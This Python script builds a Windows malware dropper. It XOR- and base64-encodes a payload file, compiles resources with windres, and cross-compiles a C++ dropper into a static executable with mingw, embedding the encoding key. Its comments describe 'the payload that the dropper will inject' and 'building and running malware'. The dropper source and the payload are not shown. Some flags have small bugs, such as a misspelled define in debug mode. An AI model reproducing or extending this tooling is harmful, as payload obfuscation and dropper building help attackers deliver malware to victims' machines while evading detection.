import os
import subprocess
import argparse
import base64
#from pathlib import Path

# converts the release/debug and x86/x64 into a PE executable with mingw.
def mingw_run(file_path, file_exe_path, configuration_bool, arch, xor_key, base64, test_output):

	if (base64 == True):
		base64_integer = 1
	else:
		base64_integer = 0

	if (test_output):
		print("This is the file path: " + file_path + " This is the output path: " + file_exe_path)
		print(f'These are the notable flags in mingw: -DDROPPER_XOR_KEY={str(xor_key)} -DDROPPER_BASE64={str(base64_integer)} -DDROPPER_OUTPUT="{file_exe_path}"')

	if (arch == 64):
		mingw_version = "x86_64-w64-mingw32-g++"
		print("mingw is compiling in x64 mode. ")
	elif (arch == 86):
		mingw_version = "i686-w64-mingw32-g++"
		print("mingw is compiling in x86 mode. ")
	else:
		mingw_version = "i686-w64-mingw32-g++"
		print("The --architecture flag only acccepts 64 or 86. \nThis script will run mingw in x86 mode.")

	print("This is your mingw_version: " + mingw_version)

	if (configuration_bool == True):
		success = subprocess.run([
		mingw_version,
		"-w",
		"-fpermissive",
		"-DNDEBUG",
		file_path,
		"-static",
		"-static-libgcc",
		"-static-libstdc++",
		"-o",
		file_exe_path,
		f"-DDROPPER_XOR_KEY={str(xor_key)}",
		f"-DDROPPER_BASE64={str(base64_integer)}",
		f'-DDROPPER_OUTPUT="{file_exe_path}"'
		])
	else:
		success = subprocess.run([
		mingw_version,
		file_path,
		"-w",
		"-fpermissive",
		"-static",
		"-static-libgcc",
		"-static-libstdc++",
		"-o",
		file_exe_path,
		f"-DDROPPER_XOR_KEY={str(xor_key)}",
		f"-DDROPPER_BASE64={str(base64_integer)}",
		f'-DDROPPPER_OUTPUT="{file_exe_path}"'
		])


	# 0 for success
	return success.returncode


#compile the rc file so it can be added with g++
def rc_compile(arch):

	if (arch == 86):
		windres_version = "i686-w64-mingw32-windres"
		pe_config = "pe-i386"
	elif (arch == 64):
		windres_version = "x86_64-w64-mingw32-windres"
		pe_config = "pe-x86-64"
	else:
		windres_version = "i686-w64-mingw32-windres"
		pe_config = "pe-i386"

	success = subprocess.run([
	windres_version,
	"-F",
	pe_config,
	"-O",
	"coff",
	"-I",
	"FileSystem_exe_rebuild/FileSystem_exe_rebuild.h",
	"FileSystem_exe_rebuild/Resource.rc",
	"-o",
	"resource.o"
	])

	# 0 for sucess
	return success.returncode

# This makes it so that the python file can take arguments.
def parse_args():
	parser = argparse.ArgumentParser(description="This is a script to encode a payload, compiles a file with mingw,  and then decode the payload.")

	# release will be prioritized if both are off.
	parser.add_argument("--release", action="store_true")
	parser.add_argument("--debug", action="store_true")

	parser.add_argument("--architecture", type=int, default=64)

	parser.add_argument("--base64", action="store_true")
	parser.add_argument("--default-xor", action="store_true")
	parser.add_argument("--xor-key", type=int, default=0)
	parser.add_argument("--both-encoding", action="store_true")

	parser.add_argument("--hardcode", action="store_true")

	parser.add_argument("--input", type=str, default="")
	parser.add_argument("--output", type=str, default="")
	parser.add_argument("--resource", type=str, default="")
	parser.add_argument("--header", type=str, default="")

	parser.add_argument("--keep-log", action="store_true")
	parser.add_argument("--log-number", type=int, default=0)
	parser.add_argument("--log", action="store_true")
	parser.add_argument("--logging-output", type=str, default="")

	parser.add_argument("--no-encode", action="store_true")
	parser.add_argument("--no-compile", action="store_true")
	parser.add_argument("--no-decode", action="store_true")

	# would handle the printing out of data.
	parser.add_argument("--test-output", action="store_true")

	args = parser.parse_args()

	return args

def log_file(base64, xor, log_number, preserve_path, payload, payload_bytes):

	with open(preserve_path, "a", encoding="utf-8") as file_preserve_read:
		if (base64 == True):
			message = "This is what is preserved before applying base64 to the payload (utf-8 decoded) from log number " + str(log_number) + ": " + payload + r"\nThis is what is preserved before applying base64 to the payload (raw bytes in hexadecimal) :" + payload_bytes.hex() + "\n\n"
			print("Original base64 input preserved.")
		elif (xor == True):
			message = "This is what is preserved before applying xor to the payload (utf-8 decoded) from log number " + str(log_number) + " : " + payload + r"\nThis is what is preserved before applying xor to the payload (raw byte format in hexadecimal): " + payload_bytes.hex() + "\n\n"
			print("Original xor input preserved.")

		print("\n")
		file_preserve_read.write(message)

def encode_read(base64, xor, payload_file, test_output):

	arr = []
	with open(payload_file, "rb") as file_read:
		payload_bytes = file_read.read()
		try:
			payload = payload_bytes.decode("utf-8")
		except UnicodeDecodeError:
			if (base64 == True):
				payload = "<This couldn't be decoded in a way that was visible from command line. That doesn't mean the base64 didn't work.>"
			elif (xor == True):
				payload = "<This couldn't be decoded in a way that was visible from command line. That doesn't mean the xor didn't work.>"

	if (test_output == True):
		if (base64 == True):
			print("This is the original version (in the base64 function) of your payload (in hexadecimal): " + payload_bytes.hex())
		if (xor == True):
			print("This is the original version (in the xor function) of your payload (in hexadecimal): " + payload_bytes.hex())

	arr.append(payload)
	arr.append(payload_bytes)
	return arr

def base64_file(payload_file, encode, decode, log, payload_preserve_path, log_number, test_output):

	base64_encode = True
	xor_encode = False
	arr = encode_read(base64_encode, xor_encode, payload_file, test_output)
	payload = arr[0]
	payload_bytes = arr[1]

#//////////////////////////////////////////

# Encoding logic

#//////////////////////////////////////////

	if (encode):
		if (log == True):
			base64_log = True
			xor_log = False
			log_file(base64_log, xor_log, log_number, payload_preserve_path, payload, payload_bytes)

		encoded_payload_bytes = base64.b64encode(payload_bytes)
		if (test_output == True):
			print("This is the base64 encoded version of your payload (in hexadecimal): " + encoded_payload_bytes.hex())
		with open(payload_file, "wb") as file_write:
			file_write.write(encoded_payload_bytes)

#//////////////////////////////////////////

# Decoding logic

#//////////////////////////////////////////

	if (decode):
		decoded_payload_bytes = base64.b64decode(payload_bytes)
		if (test_output == True):
			print("This is the base64 decoded version of your payload (in hexadecimal): " + decoded_payload_bytes.hex())
		with open(payload_file, "wb") as file_write:
			file_write.write(decoded_payload_bytes)

def xor_file(payload_file, xor_key, encode, log, payload_preserve_path, log_number, test_output):

	base64 = False
	xor = True
	arr = encode_read(base64, xor, payload_file, test_output)
	payload = arr[0]
	payload_bytes = arr[1]

# ////////////////////////////////////////////////////////////////////////////

# Reading from file.

# ////////////////////////////////////////////////////////////////////////////

	if (encode and log == True):
		base64 = False
		xor = True
		log_file(base64, xor, log_number, payload_preserve_path, payload, payload_bytes)

# ////////////////////////////////////////////////////////////////////////////

# Encoding and writing file.

# ////////////////////////////////////////////////////////////////////////////

	encoded_payload_bytes = bytes([char ^ xor_key for char in payload_bytes])

	if (test_output == True):
		print("This is the xor encoded or decoded version of your payload (in hexadecimal): " + encoded_payload_bytes.hex())

	with open(payload_file, "wb") as file_write:
		file_write.write(encoded_payload_bytes)

	return payload_file

def main():

	#//////////////////////////////////////////////////////

	# Setting all relevant file paths

	#//////////////////////////////////////////////////////

	args = parse_args()
	script_info = {

# The file that will be compiled by mingw
		"file_path" : r"FileSystem_exe_rebuild/FileSystem_exe_rebuild.cpp",

# default file path to the payload that the dropper will inject
		"file_payload_path" : r"payload_contents.txt",

# The default file path to the location of Resource.rc
		"file_resource_path" : r"FileSystem_exe_rebuild/Resource.rc",

# The default file path to the location of Resource.h
		"file_header_path" : r"FileSystem_exe_rebuild/resource.h",

# The actual exe path that mingw outputs.
		"file_exe_path" : r"FileSystem_exe_rebuild/FileSystem_exe_rebuild.exe",

# Give the location of the file that will take the original contents of the payload file
		"file_payload_preserve_path" : r"preserve_payload_contents.txt"
	}

	# Setting the script_info dictionary based on flags given by the user.
	if (args.hardcode != True):
		script_info["file_payload_path"] = input("Set the default file path to the payload that the dropper will inject: ")

		if (args.input == ""):
			script_info["file_path"] = input("Give the file path of the file that will be cross compiled with mingw: ")
		else:
			print("file_path gotten from input flag.\n")
			script_info["file_path"] = args.input

		if (args.output == ""):
			script_info["file_exe_path"] = input("Give the file path to the place where the exe will place after msbuild compiles it (should have an exe file extension): ")
		else:
			script_info["file_exe_path"] = args.output
			print("File_exe_path gotten from the output flag.")

		if (args.resource == ""):
			script_info["file_resource_path"] = input("Give the file path to the resource file you are going to use.")
		else:
			script_info["file_resource_path"] = args.resource

		if (args.header == ""):
			script_info["file_header_path"] = input("Give the file path to the header file you are going to use.")
		else:
			script_info["file_header_path"] = args.header

		if (args.logging_output != ""):
			script_info["file_payload_preserve_path"] = args.logging_output

		if (args.test_output == True):
			print("The file_payload_path is: " + script_info["file_payload_path"])
			print("The file_payload_preserve_path is: " + script_info["file_payload_preserve_path"])

		if (script_info["file_header_path"] == "" or script_info["file_resource_path"] == "" or script_info["file_exe_path"] == "" or script_info["file_payload_path"] == "" or script_info["file_path"] == "" or script_info["file_payload_preserve_path"] == ""):
			print("One or more of the variables in the script_info dictionary or the cmd line was blank.")
			return 1

	else:
		# hardcode True

		# Update the exe path based on if release, debug or neither was chosen.
		# exe path is overriden if output flag flag is set.

		if (args.input != ""):
			print("file_path gotten from input flag.")
			script_info["file_path"] = args.input

		if (args.output != ""):
			print("file_exe_path gotten from output flag.\n")
			script_info["file_exe_path"] = args.output

		if (args.resource != ""):
			print("file_resource_path gotten from resource flag.\n")
			script_info["file_resource_path"] = args.resource

		if (args.header != ""):
			print("file_header_path gotten from header flag.\n")
			script_info["file_header_path"] = args.header

		if (args.logging_output != ""):
			if (args.test_output == True):
				print("This is file_payload_preserve_path: " + args.logging_output + " It was gotten from the logging output.")
			else:
				print("file_payload_preserve_path gotten from logging output.\n")
			script_info["file_payload_preserve_path"] = args.logging_output

		elif (args.log == True):
			if (args.test_output == True):
				print("This is file_payload_preserve_path: " + args.logging_output + " It was gotten from the logging output.")

		if (args.test_output == True):
			print("The file_payload_path is: " + script_info["file_payload_path"])

		if (script_info["file_exe_path"] == "" or script_info["file_path"] == "" or script_info["file_payload_path"] == "" or script_info["file_payload_preserve_path"] == ""):
			print("Hardcode files have not been set. Open up linux_mint_script.py and set them in the main function.")
			return 1

	# The script comes with no extra files besides the payload. If there is no preserve file already and logging is not opted for then file resetting will be skipped.

	if (args.log == False and (args.logging_output != "" or args.log_number != 0)):
		print("Logging was not set with --log flag however a log output file was or log number was set. Use the --log flag to turn on logging.")

	if (args.keep_log == False):
		with open(script_info["file_payload_preserve_path"], "w", encoding="utf-8") as file_write:
			file_write.write("")
			if (args.test_output == True):
				print("file_payload_preserve_path has been reset.")

	if (args.both_encoding == True):
		args.base64 = True

	if (args.default_xor == True or args.both_encoding == True):
		args.xor_key = 115

	elif (args.xor_key != 0): # Handling custom xor keys and keeping them in a 0 - 255 range
		if (args.xor_key > 255):
			print("This script only lets positive xor_keys up to 255. No more. The script will now handle the xor_key as 255.")
			args.xor_key = 255
		elif (args.xor_key < 0):
			print("This script only lets positive xor_keys up to 255. No more. The script will now handle the xor_key as 255.")
			args.xor_key = 255

	#//////////////////////////////////////////////////////

	# Encode payload

	#//////////////////////////////////////////////////////

	if (args.no_encode == True): # no encode

		if (args.base64 == True or args.both_encoding == True):
			if (args.logging_output != ""):
				base64 = True
				xor = False
				arr = encode_read(base64, xor, script_info["file_payload_path"], args.test_output)
				payload = arr[0]
				payload_bytes = arr[1]
				if (args.log == True):
					log_file(base64, xor, args.log_number, script_info["file_payload_preserve_path"], payload, payload_bytes)

		if (args.default_xor == True or args.xor_key == True or args.both_encoding == True):
			if (args.logging_output != ""):
				base64 = False
				xor = True
				arr = encode_read(base64, xor, script_info["file_payload_path"], args.test_output)
				payload = arr[0]
				payload_bytes = arr[1]
				if (args.log == True):
					log_file(base64, xor, args.log_number, script_info["file_payload_preserve_path"], payload, payload_bytes)
		if (args.log == True):
			print("No encode flag was chosen so nothing was encoded. Logging occurred.")
		else:
			print("No encode flag was chosen so nothing was encoded. Logging did not occurred.")
	else: # do encode

		if (args.default_xor == True or args.both_encoding == True):
			encode = True
			xor_file(script_info["file_payload_path"], args.xor_key, encode, args.log, script_info["file_payload_preserve_path"], args.log_number, args.test_output)
			if (args.test_output):
				print(f"This xor key used is {args.xor_key} \n")

		# Handling base64 encoding.
		if (args.base64 == True or args.both_encoding == True):
			encode = True
			decode = False
			base64_file(script_info["file_payload_path"], encode, decode, args.log, script_info["file_payload_preserve_path"], args.log_number, args.test_output)

	#//////////////////////////////////////////////////////

	# building and running malware

	#//////////////////////////////////////////////////////

	if (args.no_compile == False):

		success = rc_compile(args.architecture)
		if (success == 0):
			print("The rc compiled successfully.")
		else:
			print("The rc did not compile successfully.")
			return 1

		if (args.release == True):
			set_mingw_release = True
			success = mingw_run(script_info["file_path"], script_info["file_exe_path"], set_mingw_release, args.architecture, args.xor_key, args.base64, args.test_output)
			if (success == 0):
				print("mingw ran successfully in release mode. Warnings are turned off.")
		elif (args.debug == True):
			set_mingw_release = False
			success = mingw_run(script_info["file_path"], script_info["file_exe_path"], set_mingw_release, args.architecture, args.xor_key, args.base64, args.test_output)
			if (success == 0):
				print("mingw ran successfully in debug mode. Warnings are turned off. ")
		else:
			# will run in Release mode.
			set_mingw_release = True
			success = mingw_run(script_info["file_path"], script_info["file_exe_path"], set_mingw_release, args.architecture, args.xor_key, args.base64, args.test_output)
			if (success == 0):
				print("mingw ran successfully in release mode. Warnings are turned off. ")

	else:
		print("No compile was chosen so nothing was compiled.")


	#//////////////////////////////////////////////////////

	# Decode payload

	#//////////////////////////////////////////////////////

	if (args.no_decode == False):
		encode = False
		decode = True

		base64_file(script_info["file_payload_path"], encode, decode, args.log, script_info["file_payload_preserve_path"], args.log_number, args.test_output)

		xor_file(script_info["file_payload_path"], args.xor_key, False, args.log, script_info["file_payload_preserve_path"], args.log_number, args.test_output)
		if (args.test_output):
				print(f"This xor key used is {args.xor_key} \n")

	else:
		print("No decode was chosen so nothing was decoded.")
main()
